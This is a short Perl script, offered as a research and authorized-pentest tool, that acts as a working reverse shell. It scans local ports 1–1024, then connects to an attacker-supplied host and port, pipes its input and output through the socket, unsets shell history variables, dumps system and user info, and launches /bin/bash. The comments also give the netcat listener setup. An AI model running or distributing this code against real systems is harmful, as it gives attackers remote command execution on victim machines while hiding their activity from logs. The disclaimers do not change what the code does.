#!/usr/bin/perl

# eWarfareActual callback TCP socket connection to netcat port.
# This script is for research use only!! 
# Do not use this for malicious purposes.
# Can also be used for testing EDR and IDS systems during an authorized pentest.

# --- Usage: callback.pl [host] [port] 
# --- Example: callback.pl localhost 8181

# ---Callback connection script requires another host to use as the attack box.
# --- Use Netcat to setup a listening port.
# --- Netcat command to run on listening host.
# --- nc -l -n v- p PORT_NUMBER



use IO::Socket;

$system = '/bin/bash';

$ARGC=@ARGV;

print "Callback Connect Perl Script\n\n";

	if ($ARGC!=2) {
	print "Usage: $0 [Host] [Port] \n\n";
	die "Ex: $0 127.0.0.1 2121 \n";
}


use Socket;
use FileHandle;

# Specify port range
$target = 'localhost';
$start_port = '1';
$end_port = '1024';


# flush the print buffer immediately
$| = 1;

# start the scanning loop
foreach ($port = $start_port ; $port <= $end_port ; $port++) 
{
	#\r will refresh the line
	# print "\rScanning port $port";
	
	#Connect to port number
	$socket = IO::Socket::INET->new(PeerAddr => $target , PeerPort => $port , Proto => 'tcp' , Timeout => 1);
	
	#Check connection
	if( $socket )
	{
		print "\r = Port $port is open.\n" ;
	}
	else
	{
		#Port is closed, nothing to print
	}
}

#print "\n\nFinished Scanning $target\n";




socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";

connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";

print "[*] Resolving HostName\n";
print "[*] Connecting... $ARGV[0] \n";
print "[*] Spawning Shell \n";
print "[*] Connected to remote host \n";

SOCKET->autoflush();

open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");

print "CALL-BACK CONNECTED\n\n";

system("unset HISTFILE; unset SAVEHIST;echo --==Systeminfo==--; uname -a;echo;
echo --==Userinfo==--; id;echo;echo --==Directory==--; pwd;echo; echo --==Shell==-- ");

system($system);
#EOF
